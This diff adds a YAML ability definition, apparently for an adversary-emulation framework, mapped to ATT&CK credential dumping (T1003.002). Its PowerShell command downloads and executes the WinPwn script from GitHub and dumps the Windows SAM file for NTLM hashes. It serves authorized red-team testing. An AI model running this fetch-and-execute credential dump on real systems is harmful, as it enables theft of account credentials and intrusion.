@@ -1,0 +1,19 @@
+---
+- id: 6851f254966e0828f9c22f8f0c9dda72
+  name: WinPwn - Loot local Credentials - Dump SAM-File for NTLM Hashes
+  description: Loot local Credentials - Dump SAM-File for NTLM Hashes technique via
+    function of WinPwn
+  tactic: credential-access
+  technique:
+    attack_id: T1003.002
+    name: 'OS Credential Dumping: Security Account Manager'
+  platforms:
+    windows:
+      psh:
+        command: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');
+          samfile -consoleoutput -noninteractive
+        payloads: []
+        cleanup: ''
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
